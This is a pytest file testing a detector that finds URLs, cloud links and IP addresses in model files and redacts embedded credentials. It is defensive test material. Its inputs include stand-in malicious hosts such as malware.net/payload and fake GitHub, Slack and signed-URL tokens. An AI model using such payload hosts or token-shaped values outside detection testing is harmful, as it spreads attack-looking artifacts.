"""Tests for network communication detection."""

import json
import os
from pathlib import Path
from urllib.parse import urlparse

import pytest

from modelaudit.detectors import network_comm
from modelaudit.detectors.network_comm import NetworkCommDetector, detect_network_communication


def _is_ci_environment() -> bool:
    """Check CI/GitHub Actions env vars to determine whether tests run in CI."""
    return bool(os.getenv("CI") or os.getenv("GITHUB_ACTIONS"))


class TestNetworkCommDetector:
    """Test the NetworkCommDetector class."""

    def test_detect_urls(self) -> None:
        """Test detection of URLs in binary data."""
        detector = NetworkCommDetector()

        # Test HTTP and HTTPS URLs
        data = b"""
        Some model data
        http://example.com/download
        https://malware.net/payload
        ftp://badserver.com/upload
        """

        findings = detector.scan(data, "test_model.pkl")

        # Should find at least 3 URLs
        url_findings = [f for f in findings if f["type"] == "url_detected"]
        assert len(url_findings) >= 3

        # Check specific URLs are detected
        urls = [f["url"] for f in url_findings]
        assert any(urlparse(url).hostname == "example.com" for url in urls)
        assert any(urlparse(url).hostname == "malware.net" for url in urls)

    def test_detect_urls_redacts_credentials_and_query(self) -> None:
        """URL findings should not preserve credentialed or signed URL secrets."""
        detector = NetworkCommDetector()
        data = (
            b"https://user:pass@example.com/model.bin?"
            b"X-Amz-Signature=SECRET_SIGNATURE&token=SECRET_TOKEN#SECRET_FRAGMENT"
        )

        findings = detector.scan(data, "model.bin")
        url_finding = next(f for f in findings if f["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/model.bin"
        assert "example.com/model.bin" in url_finding["message"]
        serialized = f"{url_finding['url']} {url_finding['message']}"
        assert "user:pass" not in serialized
        assert "SECRET_SIGNATURE" not in serialized
        assert "SECRET_TOKEN" not in serialized
        assert "SECRET_FRAGMENT" not in serialized

    def test_detect_urls_preserves_port_zero_and_rejects_hostless_netloc(self) -> None:
        """URL redaction should preserve explicit port 0 and avoid hostless netloc output."""
        detector = NetworkCommDetector()
        data = b"https://example.com:0/model.bin?token=SECRET https://@/missing-host"

        findings = detector.scan(data, "model.bin")
        url_findings = [finding for finding in findings if finding["type"] == "url_detected"]
        urls = [finding["url"] for finding in url_findings]

        assert "https://example.com:0/model.bin" in urls
        assert "[invalid-url]" in urls
        serialized = " ".join(f"{finding['url']} {finding['message']}" for finding in url_findings)
        assert "token=SECRET" not in serialized
        assert "https:///missing-host" not in serialized

    def test_cloud_storage_urls_redact_signed_query(self) -> None:
        """Cloud storage findings should redact signed URL query material."""
        detector = NetworkCommDetector()
        data = b"s3://model-bucket/path/model.bin?X-Amz-Credential=SECRET_CREDENTIAL&X-Amz-Signature=SECRET_SIGNATURE"

        findings = detector.scan(data, "model.bin")
        cloud_finding = next(f for f in findings if f["type"] == "cloud_storage_url")

        assert cloud_finding["url"] == "s3://model-bucket/path/model.bin"
        assert "model-bucket/path/model.bin" in cloud_finding["message"]
        serialized = f"{cloud_finding['url']} {cloud_finding['message']}"
        assert "SECRET_CREDENTIAL" not in serialized
        assert "SECRET_SIGNATURE" not in serialized
        assert cloud_finding["provider"] == "s3"

    def test_slack_webhook_path_tokens_are_redacted(self) -> None:
        """Slack webhook capability tokens should not survive URL findings."""
        detector = NetworkCommDetector()
        webhook_token = "SECRETWEBHOOKTOKEN123456"
        data = f"https://hooks.slack.com/services/T00000000/B00000000/{webhook_token}".encode()

        findings = detector.scan(data, "model.pkl")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://hooks.slack.com/services/<redacted>/<redacted>/<redacted>"
        assert webhook_token not in json.dumps(url_finding, sort_keys=True)

    def test_cloud_storage_path_capability_tokens_are_redacted(self) -> None:
        """Signed object URLs can carry capability tokens in path segments."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
        data = (
            f"https://storage.googleapis.com/model-bucket/{path_token}/weights.bin?X-Goog-Signature=QUERYSECRET"
        ).encode()

        findings = detector.scan(data, "model.bin")
        url_findings = [finding for finding in findings if finding["type"] in {"url_detected", "cloud_storage_url"}]

        assert url_findings
        serialized = json.dumps(url_findings, sort_keys=True)
        assert path_token not in serialized
        assert "QUERYSECRET" not in serialized
        assert "storage.googleapis.com/model-bucket/<redacted>/weights.bin" in serialized

    def test_trailing_path_delimiters_do_not_prevent_token_redaction(self) -> None:
        """Punctuation included by URL matching should not keep path tokens raw."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
        data = f"https://example.com/path/{path_token},".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>,"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_quoted_path_delimiters_do_not_prevent_token_redaction(self) -> None:
        """Single-quoted source strings should not keep path tokens raw."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
        data = f"url='https://example.com/path/{path_token}'".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>'"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_base64_path_capability_tokens_are_redacted(self) -> None:
        """Base64/base64url path tokens may contain encoded separators or padding."""
        detector = NetworkCommDetector()
        encoded_token = "AbCdEfGhIjKlMnOpQrStUvWxYz1234567890%2B%2F%3D"

        findings = detector.scan(f"https://example.com/download/{encoded_token}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>"
        assert encoded_token not in json.dumps(url_finding, sort_keys=True)

    def test_base64url_path_capability_tokens_with_hyphen_are_redacted(self) -> None:
        """Base64url path tokens can contain hyphens as data."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz123456-_"

        findings = detector.scan(f"https://example.com/download/{path_token}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_long_base64_path_capability_tokens_use_entropy_not_unique_ratio(self) -> None:
        """Long signed-CDN style path tokens should still be redacted."""
        detector = NetworkCommDetector()
        path_token = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=" * 3

        findings = detector.scan(f"https://example.com/download/{path_token}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_known_path_tokens_with_filename_suffix_are_redacted(self) -> None:
        """Known token formats must win over filename preservation."""
        detector = NetworkCommDetector()
        github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
        segment = f"{github_token}.json"

        findings = detector.scan(f"https://example.com/path/{segment}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>.json"
        assert github_token not in json.dumps(url_finding, sort_keys=True)

    def test_dotted_opaque_path_capability_tokens_are_redacted(self) -> None:
        """Unknown dotted opaque tokens should not hide behind broad filename parsing."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWx.Yz1234567890abcdefGhij.Klmn"

        findings = detector.scan(f"https://example.com/download/{path_token}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_path_parameter_tokens_are_redacted(self) -> None:
        """Matrix-style path parameters can carry capability tokens."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/download;token={path_token}/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download;token=<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_encoded_path_parameter_tokens_are_redacted(self) -> None:
        """Encoded matrix delimiters should still expose path parameter tokens."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/download%3Btoken={path_token}/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download;token=<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_path_parameter_key_tokens_are_redacted(self) -> None:
        """Matrix parameter names can carry capability tokens too."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/download;{path_token}=1/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download;<redacted>=1/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_path_segment_tokens_before_matrix_parameters_are_redacted(self) -> None:
        """A token segment followed by benign matrix params should still be redacted."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/path/{path_token};v=1/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/path/<redacted>;v=1/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize("separator", ["&", "&amp;"])
    def test_ampersand_delimited_path_tokens_are_redacted(self, separator: str) -> None:
        """Ampersand-style path suffixes should not hide capability token prefixes."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/path/{path_token}{separator}download=1".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://example.com/path/<redacted>{separator}download=1"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize("separator", ["&", "&amp;"])
    def test_ampersand_suffix_path_tokens_are_redacted(self, separator: str) -> None:
        """Ampersand-delimited suffix tokens should not survive after benign prefixes."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/path/download=1{separator}{path_token}/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://example.com/path/download=1{separator}<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize("separator", ["&", "&amp;"])
    def test_ampersand_key_value_suffix_path_tokens_are_redacted(self, separator: str) -> None:
        """Ampersand-delimited key/value suffix tokens should be redacted too."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/path/download=1{separator}token={path_token}/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://example.com/path/download=1{separator}token=<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize(
        ("encoded_suffix", "expected_suffix"),
        [("%3Fdownload=1", "?download=1"), ("%20download", " download")],
    )
    def test_encoded_delimited_path_tokens_are_redacted(self, encoded_suffix: str, expected_suffix: str) -> None:
        """Encoded URL delimiters should not hide capability token prefixes."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/path/{path_token}{encoded_suffix}".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://example.com/path/<redacted>{expected_suffix}"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_public_revision_hash_paths_are_preserved(self) -> None:
        """Public model revision hashes should remain useful for audit follow-up."""
        detector = NetworkCommDetector()
        revision = "0123456789abcdef0123456789abcdef01234567"
        data = f"https://huggingface.co/org/repo/resolve/{revision}/model.safetensors".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert revision in url_finding["url"]
        assert url_finding["url"].endswith(f"/{revision}/model.safetensors")

    def test_public_revision_names_are_preserved(self) -> None:
        """Public model branch and tag names should remain useful for audit follow-up."""
        detector = NetworkCommDetector()
        revision = "ReleaseCandidate2025-05-abcdef"
        data = f"https://huggingface.co/org/repo/resolve/{revision}/model.safetensors".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/org/repo/resolve/{revision}/model.safetensors"

    def test_known_credentials_in_public_revision_position_are_redacted(self) -> None:
        """Known secret formats should not be preserved as public model revision names."""
        detector = NetworkCommDetector()
        revision = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
        data = f"https://huggingface.co/org/repo/resolve/{revision}/model.safetensors".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://huggingface.co/org/repo/resolve/<redacted>/model.safetensors"
        assert revision not in json.dumps(url_finding, sort_keys=True)

    def test_public_model_repository_ids_are_preserved(self) -> None:
        """Known public model hosts should keep repo IDs for audit follow-up."""
        detector = NetworkCommDetector()
        repo_id = "Llama-3.1-70B-Instruct"
        data = f"https://huggingface.co/meta-llama/{repo_id}/resolve/main/model.safetensors".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/meta-llama/{repo_id}/resolve/main/model.safetensors"

    def test_huggingface_repository_home_ids_are_preserved(self) -> None:
        """Public Hugging Face repository home URLs should keep exact repo identity."""
        detector = NetworkCommDetector()
        repo_id = "Llama-3.1-70B-Instruct"
        data = f"https://huggingface.co/meta-llama/{repo_id}".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/meta-llama/{repo_id}"

    def test_single_segment_huggingface_model_ids_are_preserved(self) -> None:
        """Single-component public Hugging Face model URLs should stay useful."""
        detector = NetworkCommDetector()
        repo_id = "Llama-3.1-70B-Instruct"
        data = f"https://huggingface.co/{repo_id}".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/{repo_id}"

    def test_huggingface_api_repository_ids_are_preserved(self) -> None:
        """Hugging Face API paths should keep public repo IDs for audit follow-up."""
        detector = NetworkCommDetector()
        repo_id = "Llama-3.1-70B-Instruct"
        data = f"https://huggingface.co/api/models/meta-llama/{repo_id}".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/api/models/meta-llama/{repo_id}"

    @pytest.mark.parametrize("route", ["datasets", "spaces"])
    def test_huggingface_prefixed_repository_ids_are_preserved(self, route: str) -> None:
        """Prefixed Hugging Face repository routes should keep public repo IDs."""
        detector = NetworkCommDetector()
        repo_id = "Llama-3.1-70B-Instruct"
        data = f"https://huggingface.co/{route}/meta-llama/{repo_id}/resolve/main/data.json".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/{route}/meta-llama/{repo_id}/resolve/main/data.json"

    def test_public_github_repository_names_are_preserved(self) -> None:
        """Public source repository identities should remain visible while refs can still be redacted."""
        detector = NetworkCommDetector()
        repo_id = "MyModel-2025-LongName-abcdef"
        url = f"https://raw.githubusercontent.com/org/{repo_id}/main/model.py"

        findings = detector.scan(url.encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == url

    def test_public_github_ref_names_are_preserved(self) -> None:
        """Public GitHub source refs should remain visible for audit follow-up."""
        detector = NetworkCommDetector()
        ref = "ReleaseCandidate2025-05-abcdef"
        url = f"https://raw.githubusercontent.com/org/repo/{ref}/model.py"

        findings = detector.scan(url.encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == url

    def test_public_github_release_repository_names_are_preserved(self) -> None:
        """Public GitHub release repository identities should remain visible for audit follow-up."""
        detector = NetworkCommDetector()
        repo_id = "MyModel-2025-LongName-abcdef"
        url = f"https://github.com/org/{repo_id}/releases/download/v1/model.bin"

        findings = detector.scan(url.encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == url

    def test_non_public_hex_path_capability_tokens_are_redacted(self) -> None:
        """Opaque lowercase hex download IDs should be redacted outside public model revisions."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdef0123456789abcdef"

        findings = detector.scan(f"https://example.com/download/{path_token}".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_two_class_high_entropy_path_tokens_are_redacted(self) -> None:
        """Base32/base36-style bearer tokens may only use lowercase letters and digits."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdefghjkmnpqrstvwxyz"

        findings = detector.scan(f"https://example.com/download/{path_token}/model.bin".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
        """Domain-like path tokens should not leak through the later domain detector."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"

        findings = detector.scan(f"https://example.com/download/{path_token}/model.bin".encode(), "metadata.txt")
        serialized = json.dumps(findings, sort_keys=True)

        assert "https://example.com/download/<redacted>/model.bin" in serialized
        assert path_token not in serialized

    def test_backtick_wrapped_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
        """Markdown code delimiters should not hide the URL around a dotted path token."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"

        findings = detector.scan(f"`https://example.com/download/{path_token}/model.bin`".encode(), "metadata.txt")
        serialized = json.dumps(findings, sort_keys=True)

        assert "https://example.com/download/<redacted>/model.bin" in serialized
        assert path_token not in serialized

    def test_parenthesized_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
        """Parenthesized call URLs should still suppress redacted path-token domain hits."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"

        findings = detector.scan(
            f"requests.get(https://example.com/download/{path_token}/model.bin)".encode(), "metadata.txt"
        )
        serialized = json.dumps(findings, sort_keys=True)

        assert "https://example.com/download/<redacted>/model.bin" in serialized
        assert path_token not in serialized

    def test_markdown_link_dotted_path_tokens_do_not_leak_as_domain_findings(self) -> None:
        """Markdown-link parentheses should bound URL domain suppression."""
        detector = NetworkCommDetector()
        path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"

        findings = detector.scan(
            f"[model](https://example.com/download/{path_token}/model.bin)".encode(), "metadata.txt"
        )
        serialized = json.dumps(findings, sort_keys=True)

        assert "https://example.com/download/<redacted>/model.bin" in serialized
        assert path_token not in serialized

    def test_domain_suppression_url_lookup_is_bounded(self) -> None:
        """Domain suppression should not scan unbounded whitespace-free buffers."""
        path_token = "0123456789abcdefghjkmnpqrstvwxyz.com"
        data = (
            b"https://example.com/"
            + b"a" * (network_comm._MAX_URL_TEXT_LOOKUP_BYTES + 1)
            + f"/{path_token}/model.bin".encode()
        )

        assert network_comm._url_text_containing_offset(data, data.index(path_token.encode())) is None

    def test_encoded_path_separator_tokens_are_redacted(self) -> None:
        """Encoded separators should not make a token and following artifact look benign."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz012345"

        findings = detector.scan(f"https://example.com/download/{path_token}%2Fweights.bin".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>%2Fweights.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize("separator", [":", "%3A"])
    def test_colon_delimited_path_tokens_are_redacted(self, separator: str) -> None:
        """Colon-delimited keyed capabilities should have the token component removed."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(
            f"https://example.com/download/token{separator}{path_token}/model.bin".encode(),
            "metadata.txt",
        )
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/token:<redacted>/model.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_high_entropy_artifact_filename_stems_are_redacted(self) -> None:
        """Opaque bearer tokens carried as known artifact filenames should not bypass redaction."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"

        findings = detector.scan(f"https://example.com/download/{path_token}.bin".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_urlsafe_artifact_filename_stems_are_redacted(self) -> None:
        """URL-safe base64 token stems may include hyphen and underscore before artifact suffixes."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz123456-_"

        findings = detector.scan(f"https://example.com/download/{path_token}.bin".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    def test_lowercase_urlsafe_artifact_filename_stems_are_redacted(self) -> None:
        """Lowercase URL-safe token stems with separators should still be entropy-checked."""
        detector = NetworkCommDetector()
        path_token = "abcdefghjkmnpqrstvwxyz0123456789-_"

        findings = detector.scan(f"https://example.com/download/{path_token}.bin".encode(), "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/download/<redacted>.bin"
        assert path_token not in json.dumps(url_finding, sort_keys=True)

    @pytest.mark.parametrize(
        "url",
        [
            "https://storage.googleapis.com/model-bucket-1234567890abcdef/weights.bin",
            "https://account.blob.core.windows.net/model-container-1234567890abcdef/weights.bin",
        ],
    )
    def test_path_style_cloud_bucket_names_are_preserved(self, url: str) -> None:
        """Path-style cloud bucket/container names should remain actionable."""
        detector = NetworkCommDetector()

        findings = detector.scan(url.encode(), "metadata.txt")
        url_findings = [finding for finding in findings if finding["type"] in {"url_detected", "cloud_storage_url"}]

        assert url_findings
        serialized = json.dumps(url_findings, sort_keys=True)
        assert url in serialized
        assert "<redacted>" not in serialized

    def test_path_style_cloud_bucket_parameters_are_redacted(self) -> None:
        """Bucket identity should stay visible while bucket path-parameter tokens are redacted."""
        detector = NetworkCommDetector()
        path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
        url = f"https://storage.googleapis.com/model-bucket;token={path_token}/weights.bin"

        findings = detector.scan(url.encode(), "metadata.txt")
        url_findings = [finding for finding in findings if finding["type"] in {"url_detected", "cloud_storage_url"}]

        assert url_findings
        serialized = json.dumps(url_findings, sort_keys=True)
        assert "model-bucket;token=<redacted>" in serialized
        assert path_token not in serialized

    @pytest.mark.parametrize(
        ("url", "expected_url"),
        [
            (
                "wasbs://container@account.blob.core.windows.net/AbCdEfGhIjKlMnOpQrStUvWxYz012345/weights.bin",
                "wasbs://container@account.blob.core.windows.net/<redacted>/weights.bin",
            ),
            (
                "abfss://container@account.dfs.core.windows.net/AbCdEfGhIjKlMnOpQrStUvWxYz012345/weights.bin",
                "abfss://container@account.dfs.core.windows.net/<redacted>/weights.bin",
            ),
        ],
    )
    def test_wasb_and_abfs_object_path_tokens_are_redacted(self, url: str, expected_url: str) -> None:
        """WASB/ABFS containers live in the authority, so the first path segment is still object data."""
        detector = NetworkCommDetector()

        findings = detector.scan(url.encode(), "metadata.txt")
        cloud_finding = next(finding for finding in findings if finding["type"] == "cloud_storage_url")

        assert cloud_finding["url"] == expected_url
        assert "AbCdEfGhIjKlMnOpQrStUvWxYz012345" not in json.dumps(cloud_finding, sort_keys=True)

    def test_encoded_wasb_userinfo_credentials_are_stripped(self) -> None:
        """Encoded credential userinfo must not be mistaken for an Azure container name."""
        detector = NetworkCommDetector()
        url = "wasbs://user%3ASECRET@account.blob.core.windows.net/model.bin"

        findings = detector.scan(url.encode(), "metadata.txt")
        cloud_finding = next(finding for finding in findings if finding["type"] == "cloud_storage_url")

        assert cloud_finding["url"] == "wasbs://account.blob.core.windows.net/model.bin"
        assert "user%3ASECRET" not in json.dumps(cloud_finding, sort_keys=True)

    def test_gcs_api_bucket_names_are_preserved(self) -> None:
        """GCS JSON/download API bucket segments live after /b/ rather than at path index 1."""
        detector = NetworkCommDetector()
        url = "https://storage.googleapis.com/download/storage/v1/b/model-bucket-1234567890abcdef/o/weights.bin"

        findings = detector.scan(url.encode(), "metadata.txt")
        url_findings = [finding for finding in findings if finding["type"] in {"url_detected", "cloud_storage_url"}]

        assert url_findings
        serialized = json.dumps(url_findings, sort_keys=True)
        assert "model-bucket-1234567890abcdef" in serialized
        assert "<redacted>" not in serialized

    def test_gcs_object_key_tokens_after_b_directory_are_redacted(self) -> None:
        """Only GCS API /b/{bucket}/ routes should preserve the segment after b."""
        detector = NetworkCommDetector()
        path_token = "AbCdEfGhIjKlMnOpQrStUvWxYz012345"
        url = f"https://storage.googleapis.com/model-bucket/b/{path_token}/weights.bin"

        findings = detector.scan(url.encode(), "metadata.txt")
        cloud_finding = next(finding for finding in findings if finding["type"] == "cloud_storage_url")

        assert cloud_finding["url"] == "https://storage.googleapis.com/model-bucket/b/<redacted>/weights.bin"
        assert path_token not in json.dumps(cloud_finding, sort_keys=True)

    def test_long_artifact_filenames_are_preserved(self) -> None:
        """Ordinary model artifact filenames should not be treated as capability tokens."""
        detector = NetworkCommDetector()
        filename = "pytorch_model-00001-of-00002.bin"
        data = f"https://huggingface.co/org/repo/resolve/main/{filename}".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert filename in url_finding["url"]

    def test_safetensors_artifact_filenames_are_preserved(self) -> None:
        """SafeTensors shard names should stay visible for audit and SBOM follow-up."""
        detector = NetworkCommDetector()
        filename = "pytorch_model-00001-of-00002.safetensors"
        data = f"https://huggingface.co/org/repo/resolve/main/{filename}".encode()

        findings = detector.scan(data, "metadata.txt")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == f"https://huggingface.co/org/repo/resolve/main/{filename}"

    @pytest.mark.parametrize("prefix", ["ghp", "gho", "ghu", "ghs", "ghr"])
    def test_github_path_tokens_are_redacted(self, prefix: str) -> None:
        """Known token formats embedded in URL paths should be removed."""
        detector = NetworkCommDetector()
        github_token = f"{prefix}_abcdefghijklmnopqrstuvwxyz0123456789"
        data = f"https://raw.githubusercontent.com/org/repo/{github_token}/model.py".encode()

        findings = detector.scan(data, "model.pkl")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://raw.githubusercontent.com/org/repo/<redacted>/model.py"
        assert github_token not in json.dumps(url_finding, sort_keys=True)

    def test_benign_short_url_paths_are_preserved(self) -> None:
        """Ordinary URL paths should remain readable after redaction."""
        detector = NetworkCommDetector()

        findings = detector.scan(b"https://example.com/models/v1/model.bin", "model.pkl")
        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")

        assert url_finding["url"] == "https://example.com/models/v1/model.bin"

    def test_detect_ipv4_addresses(self) -> None:
        """Test detection of IPv4 addresses."""
        detector = NetworkCommDetector()

        data = b"""
        192.168.1.1
        10.0.0.1
        8.8.8.8
        172.16.0.1
        """

        findings = detector.scan(data)
        ipv4_findings = [f for f in findings if f["type"] == "ipv4_address"]

        assert len(ipv4_findings) == 4

        # Check private vs public classification
        private_ips = [f for f in ipv4_findings if f.get("is_private")]
        public_ips = [f for f in ipv4_findings if f.get("is_global")]

        assert len(private_ips) == 3  # 192.168, 10.0, 172.16
        assert len(public_ips) == 1  # 8.8.8.8

    def test_nearby_version_word_does_not_hide_ipv4(self) -> None:
        """Nearby prose should not hide an actual IP address."""
        detector = NetworkCommDetector()

        findings = detector.scan(b"callback version 8.8.8.8 now")

        assert any(finding["type"] == "ipv4_address" and finding["ip"] == "8.8.8.8" for finding in findings)

    def test_explicit_version_literals_are_not_reported_as_ipv4(self) -> None:
        """Version-shaped metadata should not be reported as network endpoints."""
        detector = NetworkCommDetector()

        findings = detector.scan(
            b"version 1.2.3.4\nmodel version 2.3.4.5\nrelease 3.4.5.6\nver=4.5.6.7 build=5.6.7.8\n"
        )

